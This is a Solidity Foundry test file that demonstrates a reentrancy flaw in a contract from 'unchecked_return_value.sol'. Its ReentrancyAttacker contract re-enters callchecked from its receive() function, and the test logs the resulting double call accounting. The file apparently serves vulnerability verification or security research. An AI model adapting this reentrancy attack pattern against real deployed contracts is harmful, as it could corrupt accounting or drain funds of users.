// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unchecked_return_value.sol";

contract ReturnValueTest is Test {
    ReturnValue public returnValue;
    ReentrancyAttacker public attacker;

    function setUp() public {
        returnValue = new ReturnValue();
        attacker = new ReentrancyAttacker(address(returnValue));
    }

    function testReentrancyInCallchecked() public {
        console.log("--- BEFORE-Trigger State ---");
        // Pre-attack state
        (uint256 attackerCallsBefore,) = returnValue.getCallStats(address(attacker));
        uint256 attackerSuccessBefore = returnValue.successfulCalls(address(attacker));
        uint256 totalCallsBefore = returnValue.totalCalls();
        uint256 totalSuccessBefore = returnValue.totalSuccessfulCalls();
        
        console.log("Attacker calls before:", attackerCallsBefore);
        console.log("Attacker successful calls before:", attackerSuccessBefore);
        console.log("Total calls before:", totalCallsBefore);
        console.log("Total successful calls before:", totalSuccessBefore);

        console.log("--- Trigger callchecked ---");
        // Execute vulnerable function (critical attack action)
        returnValue.callchecked(address(attacker));
        
        console.log("--- AFTER-Trigger State ---");
        // Post-attack state
        (uint256 attackerCallsAfter,) = returnValue.getCallStats(address(attacker));
        uint256 attackerSuccessAfter = returnValue.successfulCalls(address(attacker));
        uint256 totalCallsAfter = returnValue.totalCalls();
        uint256 totalSuccessAfter = returnValue.totalSuccessfulCalls();
        
        console.log("Attacker calls after:", attackerCallsAfter);
        console.log("Attacker successful calls after:", attackerSuccessAfter);
        console.log("Total calls after:", totalCallsAfter);
        console.log("Total successful calls after:", totalSuccessAfter);
        
        // Compute state differentials
        uint256 attackerCallsDiff = attackerCallsAfter - attackerCallsBefore;
        uint256 attackerSuccessDiff = attackerSuccessAfter - attackerSuccessBefore;
        uint256 totalCallsDiff = totalCallsAfter - totalCallsBefore;
        uint256 totalSuccessDiff = totalSuccessAfter - totalSuccessBefore;
        
        console.log("--- Differential Analysis ---");
        console.log("Attacker calls increased by:", attackerCallsDiff);
        console.log("Total calls increased by:", totalCallsDiff);
        
        // Vulnerability verification (expect all increments to be exactly 2)
        bool hasOvercountedCalls = attackerCallsDiff > 1;
        bool hasExpectedExploit = (attackerCallsDiff == 2 && attackerSuccessDiff == 2 &&
                                  totalCallsDiff == 2 && totalSuccessDiff == 2);
        
        if (hasExpectedExploit) {
            console.log("Vulnerability confirmed: Reentrancy caused double call accounting");
        } else if (hasOvercountedCalls) {
            console.log("Vulnerability confirmed: Reentrancy caused abnormal call increment (%d)", attackerCallsDiff);
        } else {
            console.log("Vulnerability not confirmed: Call stats increased by only %d", attackerCallsDiff);
        }
        
        // Final verdict
        if (hasOvercountedCalls) {
            console.log("Vulnerability Exists: Reentrancy allowed multiple call recordings");
        } else {
            console.log("Vulnerability not Exist: No abnormal call accounting detected");
        }
    }
}

contract ReentrancyAttacker {
    ReturnValue public target;
    uint256 private reentered;

    constructor(address _target) {
        target = ReturnValue(_target);
    }

    receive() external payable {
        // Perform a single reentrancy attack
        if (reentered == 0) {
            reentered++;
            target.callchecked(address(this));
        }
    }
}